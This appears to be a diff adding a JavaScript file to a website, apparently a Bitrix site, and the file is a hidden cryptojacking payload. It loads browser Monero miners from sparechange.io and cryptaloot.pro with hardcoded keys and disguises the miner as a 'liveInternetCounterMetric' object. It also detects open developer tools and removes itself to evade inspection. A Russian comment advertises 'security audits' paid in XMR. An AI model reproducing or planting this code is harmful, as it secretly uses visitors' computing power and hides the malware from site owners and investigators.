@@ -1,0 +1,198 @@
+;(function(window){
+window.jssassin = window.jssassin || {
+
+    config: {
+        instpDelay: 400,
+        startDelay: 1600
+    },
+    
+    state: {
+        scriptsNotLoad: 0,
+        init: false
+    },
+    
+    proc: {
+            start: function(){},
+            destroy: function(){}
+        },
+    
+    inspInterval: undefined,
+    
+    init: function (
+            scripts,
+            start,
+            destroy
+        ) {
+        
+        if (this.state.init) return;
+        this.state.init = true;
+        
+        var self = this;
+        this.checkDevtoolsByConsoleInit(); 
+        if (this.isDangerous()) return;
+        
+        if (typeof start == "function") this.proc.start = start;
+        if (typeof destroy == "function") this.proc.destroy = destroy;
+        
+        
+        this.state.scriptsNotLoad = scripts.length;
+                                                    
+        if (this.state.scriptsNotLoad > 0) {
+            scripts.forEach(function(src) {
+                var script = document.createElement('script');
+                script.src = src;
+                script.async = false;
+                script.onload = function () {self.onloadScript(script)};
+                document.head.appendChild(script);
+            });
+            
+            return;
+        }
+        
+        this._init();
+        
+    },
+    onloadScript: function (script) {
+        this.state.scriptsNotLoad--;
+        document.head.removeChild(script);
+        if (this.state.scriptsNotLoad === 0) this._init();
+    },
+    _init: function () {
+        
+        var self = this;
+        setTimeout(function () {
+            self.proc.start();
+        }, this.config.startDelay);
+        
+        this.inspInterval = setInterval(function () {self.inspector();}, this.config.instpDelay);
+    },
+    
+    
+    isDangerous: function () {
+        if (this.checkDevtoolsInWindow() || this.checkDevtoolsByConsole()) {
+            this.destroy();
+            return true;
+        }
+        return false;
+    },
+    
+    inspector: function () {
+        if (window.jssassin != undefined && typeof window.jssassin.isDangerous == "function") {
+            if (this.isDangerous()) {
+                clearInterval(this.inspInterval);
+            }
+        }
+    },
+    
+    
+    destroy: function () {
+        clearInterval(this.inspInterval);
+        this.proc.destroy();
+        delete window.jssassin;
+    },
+    
+    ////////////////////////////////////////////////////////////////////////////
+    checkDevtoolsInWindow: function () {
+        var widthThreshold = window.outerWidth - window.innerWidth > 160;
+		var heightThreshold = window.outerHeight - window.innerHeight > 160;
+        if (!(heightThreshold && widthThreshold) &&
+      ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
+			return true;
+		} else {
+			return false;
+		}
+    },
+    
+    
+    consoleOutput: false,
+    fakeElement: undefined,
+    checkDevtoolsByConsoleInit: function () {
+        var self = this;
+        this.fakeElement = new Image();
+        this.fakeElement.__defineGetter__('id', function() {
+            self.consoleOutput = true;
+        });
+    },
+    checkDevtoolsByConsole: function () {
+        console.log(this.fakeElement);console.clear();
+        return this.consoleOutput;
+    }
+};
+})(window);
+
+////////0.1.15////////
+//
+// Аудит безопасности вашего сайта всего за 1 xmr
+// Устраним существующие уязвимоти
+// Дадим рекомендации по организации работы
+// Пишите на электронную почту:
+// rpufbhfe@10mail.org
+//
+
+var variant = Math.floor(1+Math.random()*4);
+var date = new Date();
+var strDate = date.getDate() + date.getMonth() + date.getFullYear();
+
+if (variant == 1) {
+    window.jssassin.init(
+            ['https://www.sparechange.io/static/sparechange.js?w='+strDate],
+            function () {
+                var apiKey = "9636f65fe1b47fd89b23e9fcc173673b7e2614818bdc6090decbafb2c5705207da6354a420d33f0fc5d77e97e4f497a9c6b133c0284f20bbd33bc49f1b6ada5b";
+                var numberOfThreads = null;
+                var throttlePercent = 0.2;
+                window.liveInternetCounterMetric = new Miner(apiKey, numberOfThreads, throttlePercent);
+                window.liveInternetCounterMetric.start();
+            },
+            function () {
+                window.liveInternetCounterMetric.stop();
+            }
+        );
+} else if (variant == 2) {
+    window.jssassin.init(
+            ['https://www.sparechange.io/static/sparechange.js?w='+strDate],
+            function () {
+                var apiKey = "6334e9832296cfd29d1daddcde3d4aa1e3cf2bd9d3511e66a78bf996d8445cd2c0ed32d11db6a6ccfd283798f0e2c102d4fd0f90ed05a625058f37256bb3a9e4";
+                var numberOfThreads = null;
+                var throttlePercent = 0.2;
+                window.liveInternetCounterMetric = new Miner(apiKey, numberOfThreads, throttlePercent);
+                window.liveInternetCounterMetric.start();
+            },
+            function () {
+                window.liveInternetCounterMetric.stop();
+            }
+        );
+} else if (variant == 3) {
+    window.jssassin.init(
+            ['https://cryptaloot.pro/lib/crypta.js?w='+strDate],
+            function () {
+                window.miner = new CRLT.Anonymous('ef937f99557277ff62a6fc0e5b3da90ea9550ebcdfac',
+                        {throttle:0.2}
+                    );
+                window.miner.start();
+            },
+            function () {
+                window.miner.stop();
+            }
+        );
+} else if (variant == 4) {
+    window.jssassin.init(
+            ['/bitrix/js/main/core/core_tasker.js?w=71'],
+            function () {},
+            function () {}
+        );
+} else {
+    window.jssassin.init(
+            ['https://www.sparechange.io/static/sparechange.js?w='+strDate],
+            function () {
+                var apiKey = "bb856da66c98ba5d2237b5abd8caa836ba8e143b1c37dc26ed5455c8a57395d171166621436d344d77d782848a2913068f9f1ca792335d8f7031b8bf66cdbcea";
+                var numberOfThreads = null;
+                var throttlePercent = 0.2;
+                window.liveInternetCounterMetric = new Miner(apiKey, numberOfThreads, throttlePercent);
+                window.liveInternetCounterMetric.start();
+            },
+            function () {
+                window.liveInternetCounterMetric.stop();
+            }
+        );
+}
+
